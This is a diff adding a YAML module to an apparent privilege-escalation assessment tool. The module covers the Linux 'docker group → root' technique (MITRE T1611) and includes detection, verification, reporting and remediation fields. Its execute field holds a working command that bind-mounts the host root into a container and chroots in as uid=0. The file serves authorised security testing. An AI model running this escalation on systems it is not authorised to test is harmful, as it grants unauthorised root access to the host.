@@ -1,0 +1,49 @@
+# docker group → root
+#
+# Membership in the `docker` group is root-equivalent by design — the
+# docker daemon runs as root and any group member can bind-mount the
+# host filesystem into a container it launches. Chroot in, and the
+# operator has full host read/write as uid=0. Ported from
+# privesc._d_docker_group.
+#
+# MITRE: T1611 (Escape to Host) is the technique this maps to — a
+# docker-group user isn't literally inside a container yet, but the
+# primitive is identical (host / mount + chroot) and the reportkb
+# category (docker_group) matches what the inlined driver used.
+technique: T1611
+name: docker group → root
+tactic: [privilege-escalation]
+platform: [linux]
+key: group:docker
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  # Predicate returns False when the operator IS already root — an
+  # escalation from uid=0 is nonsense; mirrors the inlined driver's
+  # `not facts.is_root` gate.
+  linux_group: docker
+execute:
+  # Mount host `/` into an alpine container and chroot in. The container
+  # runs as uid=0 by default; the mount gives that uid=0 full host
+  # filesystem access. `id` in the chroot proves it.
+  command: "docker run -v /:/mnt --rm alpine chroot /mnt id"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: docker_group
+  evidence: "member of the docker group"
+  description: >
+    The docker group is root-equivalent by design: the docker daemon
+    runs as root, and any group member can `docker run -v /:/mnt` to
+    bind-mount the host root and then chroot in. Not a bug — the
+    intended trust model treats group membership as admin.
+  remediation: >
+    Do not grant `docker` group membership to non-admin users.
+    Where a service account needs container control, isolate it in
+    a dedicated user + a hardened daemon socket (rootless docker,
+    podman, or a scoped socket ACL).
+  refs: [T1611, docker-daemon-security]
